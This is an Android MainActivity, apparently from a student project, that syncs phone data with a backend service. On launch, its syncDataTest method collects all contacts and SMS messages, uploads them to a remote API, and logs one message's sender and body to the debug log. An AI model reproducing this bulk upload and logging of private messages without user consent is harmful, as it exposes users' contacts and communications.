package fr.intechinfo.fusionandroid;

import android.support.design.widget.NavigationView;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.MenuItem;
import android.support.v7.widget.Toolbar;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.messaging.FirebaseMessagingService;

import retrofit2.Call;

import static android.content.ContentValues.TAG;


public class MainActivity extends AppCompatActivity {

    private DrawerLayout mDrawerLayout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBar actionbar = getSupportActionBar();
        actionbar.setDisplayHomeAsUpEnabled(true);
        actionbar.setHomeAsUpIndicator(R.drawable.ic_menu);

        mDrawerLayout = findViewById(R.id.drawer_layout);

        NavigationView navigationView = findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(
            new NavigationView.OnNavigationItemSelectedListener() {
                @Override
                public boolean onNavigationItemSelected(MenuItem menuItem) {
                    // set item as selected to persist highlight
                    menuItem.setChecked(true);
                    // close drawer when item is tapped
                    mDrawerLayout.closeDrawers();

                    // Add code here to update the UI based on the item selected
                    // For example, swap UI fragments here

                    return true;
                }
            });

        onNewIntent(getIntent());
        FirebaseMessaging.getInstance().subscribeToTopic("ServiceNow");
        PermissionUtil.initPermissions(this);
        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
        Token token = new Token();
        token.SetToken(FirebaseInstanceId.getInstance().getToken());
        final Call<Token> stringCall = retrofitAPI.CreateNewDevice(token);
        HttpExecute t = new HttpExecute(stringCall);
        t.start();
        syncDataTest();
    }

    protected void syncDataTest(){
        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
        ContentCollector cc = new ContentCollector();
        ContactsList contactLs = new ContactsList();
        contactLs.SetContact(cc.GetContacts(this));
        Log.d("SYNC","Name : "+ contactLs.GetContact().get(1).GetName()+" Number : " + contactLs.GetContact().get(1).GetNumber());
        SMSList SMSLs = new SMSList();
        SMSLs.SetSMS(cc.GetSMS(this));
        Log.d("SYNC","Address : "+ SMSLs.GetSMS().get(3).GetAddress()+" Message : " + SMSLs.GetSMS().get(3).GetBody()+" Date : "+SMSLs.GetSMS().get(3).GetDate()+" Type : "+SMSLs.GetSMS().get(3).GetType());

        new HttpExecute(retrofitAPI.CreateContacts(contactLs)).start();
        new HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start();
    }
}
